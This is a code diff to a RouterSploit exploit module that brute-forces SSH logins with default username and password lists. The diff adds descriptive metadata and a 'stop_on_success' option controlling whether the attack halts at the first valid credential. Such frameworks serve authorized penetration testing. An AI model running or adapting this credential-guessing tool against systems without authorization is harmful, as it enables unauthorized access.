@@ -22,9 +22,17 @@ class Exploit(exploits.Exploit):
     """
     __info__ = {
         'name': 'SSH Default Creds',
-        'author': [
+        'description': 'Module perform dictionary attack with default credentials against SSH service. '
+                       'If valid credentials are found, they are displayed to the user.',
+        'authors': [
             'Marcin Bury <marcin.bury[at]reverse-shell.com>'  # routersploit module
-        ]
+        ],
+        'references': [
+            '',
+        ],
+        'devices': [
+            'Multi',
+        ],
     }
 
     target = exploits.Option('', 'Target IP address or file with target:port (file://)')
@@ -32,6 +40,7 @@ class Exploit(exploits.Exploit):
     threads = exploits.Option(8, 'Numbers of threads')
     defaults = exploits.Option(wordlists.defaults, 'User:Pass or file with default credentials (file://)')
     verbosity = exploits.Option('yes', 'Display authentication attempts')
+    stop_on_success = exploits.Option('yes', 'Stop on first valid authentication attempt')
 
     credentials = []
 
@@ -90,10 +99,10 @@ class Exploit(exploits.Exploit):
 
                 print_error("Target: {}:{} {}: {} Username: '{}' Password: '{}'".format(self.target, self.port, name, err, user, password), verbose=module_verbosity)
             else:
-                running.clear()
+                if boolify(self.stop_on_success):
+                    running.clear()
 
                 print_success("Target: {}:{} {} Authentication Succeed - Username: '{}' Password: '{}'".format(self.target, self.port, name, user, password), verbose=module_verbosity)
-
                 self.credentials.append((self.target, self.port, user, password))
 
         print_status(name, 'process is terminated.', verbose=module_verbosity)
